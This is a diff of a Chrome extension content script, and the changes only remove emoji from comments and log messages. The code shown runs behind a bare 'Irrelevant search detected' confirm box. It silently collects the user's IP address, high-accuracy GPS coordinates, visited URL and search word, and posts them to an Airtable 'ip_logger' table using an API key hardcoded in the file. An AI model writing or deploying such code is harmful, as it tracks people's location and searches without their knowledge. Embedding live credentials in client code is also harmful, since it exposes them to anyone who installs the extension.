@@ -9,70 +9,70 @@ const API_KEY = 'patvAOxoSd15KysIK.57cee6fb3fea6a06e73f3da81bf868c02624cc2f02af4
 const BASE_ID = 'app6NIjzMgElahvq8';
 const TABLE_NAME = 'ip_logger';
 
-// ✅ Step 1: Fetch `initialUrl` and `word` from background.js
+//  Step 1: Fetch `initialUrl` and `word` from background.js
 chrome.runtime.sendMessage({ action: "getData" }, (response) => {
     if (response && response.initialUrl) {
         initialUrl = response.initialUrl;
         word = response.word;
-        console.log("✅ Got Initial URL:", initialUrl);
-        console.log("✅ Got searched word:", word);
+        console.log(" Got Initial URL:", initialUrl);
+        console.log(" Got searched word:", word);
     } else {
-        console.error("❌ Failed to get data from background.js. Redirecting...");
+        console.error(" Failed to get data from background.js. Redirecting...");
         window.location.href = initialUrl;
         return;
     }
 
-    // ✅ Now show confirmation alert
+    //  Now show confirmation alert
     processUserChoice();
 });
 
-// ✅ Step 2: Handle user confirmation
+//  Step 2: Handle user confirmation
 function processUserChoice() {
     let userChoice = confirm('Irrelevant search detected. Do you wish to continue?');
 
     if (userChoice) {
         toggle = 1;
-        console.log("🟢 User clicked OK, setting toggle:", toggle);
+        console.log(" User clicked OK, setting toggle:", toggle);
 
         // Notify background.js to update toggle
         chrome.runtime.sendMessage({ action: "updateToggle", toggle });
 
-        // ✅ Fetch IP & GPS location before redirecting
+        //  Fetch IP & GPS location before redirecting
         fetchIpAddress()
             .then(ipData => {
                 ip_address = ipData;
-                console.log("🌍 IP Address:", ip_address);
+                console.log(" IP Address:", ip_address);
                 return getGPSLocation();
             })
             .then(gpsLocation => {
                 userLocation = gpsLocation;
-                console.log("📍 GPS-based Location:", userLocation);
+                console.log(" GPS-based Location:", userLocation);
             })
             .catch(error => {
-                console.warn("⚠️ GPS failed, falling back to IP-based location:", error);
+                console.warn("⚠ GPS failed, falling back to IP-based location:", error);
                 return fetchUserLocation(ip_address);
             })
             .then(ipLocation => {
                 if (!userLocation) userLocation = ipLocation;
-                console.log("✅ Final Location Used:", userLocation);
+                console.log(" Final Location Used:", userLocation);
 
-                // ✅ Write to Airtable with delay before redirecting
+                //  Write to Airtable with delay before redirecting
                 return writeToAirtable(userLocation, ip_address, initialUrl, word);
             })
             .then(() => {
-                console.log("⏳ Waiting 1 second before redirection to ensure Airtable writes...");
+                console.log(" Waiting 1 second before redirection to ensure Airtable writes...");
                 setTimeout(() => {
-                    console.log("➡️ Redirecting now...");
+                    console.log(" Redirecting now...");
                     window.location.href = initialUrl;
                 }, 1000); // 1 second delay before redirecting
             })
             .catch(error => {
-                console.error('❌ Error occurred:', error);
+                console.error(' Error occurred:', error);
                 window.location.href = initialUrl;
             });
 
     } else {
-        console.log("🔴 User clicked Cancel. Redirecting to Google...");
+        console.log(" User clicked Cancel. Redirecting to Google...");
         chrome.runtime.sendMessage({ action: "updateToggle", toggle });
         window.location.href = "https://www.google.com";
     }
@@ -80,7 +80,7 @@ function processUserChoice() {
 
 //--------------------------------------------------------------------------
 
-// ✅ Function to write data to Airtable (Waits before redirecting)
+//  Function to write data to Airtable (Waits before redirecting)
 async function writeToAirtable(location, ip, initialUrl, word) {
     const url = `https://api.airtable.com/v0/${BASE_ID}/${TABLE_NAME}`;
     const record = {
@@ -97,7 +97,7 @@ async function writeToAirtable(location, ip, initialUrl, word) {
     };
 
     try {
-        console.log("📤 Sending data to Airtable...");
+        console.log(" Sending data to Airtable...");
         const response = await fetch(url, {
             method: 'POST',
             headers: {
@@ -110,16 +110,16 @@ async function writeToAirtable(location, ip, initialUrl, word) {
         const responseBody = await response.json();
 
         if (response.ok) {
-            console.log('✅ Successfully written to Airtable:', responseBody);
+            console.log(' Successfully written to Airtable:', responseBody);
         } else {
-            console.error('❌ Airtable API Error:', response.status, responseBody);
+            console.error(' Airtable API Error:', response.status, responseBody);
         }
     } catch (error) {
-        console.error('❌ Fetch Error while writing to Airtable:', error);
+        console.error(' Fetch Error while writing to Airtable:', error);
     }
 }
 
-// ✅ Function to fetch GPS-based user location (High Accuracy)
+//  Function to fetch GPS-based user location (High Accuracy)
 function getGPSLocation() {
     return new Promise((resolve, reject) => {
         if ("geolocation" in navigator) {
@@ -127,7 +127,7 @@ function getGPSLocation() {
                 (position) => {
                     const { latitude, longitude, accuracy } = position.coords;
                     if (accuracy > 1000) {
-                        reject("❌ Low GPS accuracy detected (likely Wi-Fi/IP location).");
+                        reject(" Low GPS accuracy detected (likely Wi-Fi/IP location).");
                     } else {
                         resolve(`Lat: ${latitude}, Lon: ${longitude}`);
                     }
@@ -142,24 +142,24 @@ function getGPSLocation() {
                 }
             );
         } else {
-            reject("❌ Geolocation not supported.");
+            reject(" Geolocation not supported.");
         }
     });
 }
 
-// ✅ Function to fetch IP address
+//  Function to fetch IP address
 async function fetchIpAddress() {
     try {
         const response = await fetch('https://api64.ipify.org?format=json');
         const data = await response.json();
         return data.ip;
     } catch (error) {
-        console.error('❌ Error fetching IP address:', error);
+        console.error(' Error fetching IP address:', error);
         return "Unknown IP";
     }
 }
 
-// ✅ Function to fetch user location using IP (fallback)
+//  Function to fetch user location using IP (fallback)
 async function fetchUserLocation(ip) {
     const url = `http://ip-api.com/json/${ip}`;
 
@@ -170,16 +170,16 @@ async function fetchUserLocation(ip) {
         if (response.ok && data.status === 'success') {
             return `${data.city}, ${data.regionName}, ${data.country}, Lat: ${data.lat}, Lon: ${data.lon},${data.as}`;
         } else {
-            console.error('❌ Error fetching IP-based location:', data.message || 'Unknown error');
+            console.error(' Error fetching IP-based location:', data.message || 'Unknown error');
             return "Location not found";
         }
     } catch (error) {
-        console.error('❌ Error fetching IP-based location:', error);
+        console.error(' Error fetching IP-based location:', error);
         return "Location not found";
     }
 }
 
-// ✅ Function to get Indian timestamp
+//  Function to get Indian timestamp
 function getIndianTimeStamp() {
     const date = new Date();
     return new Intl.DateTimeFormat('en-IN', {
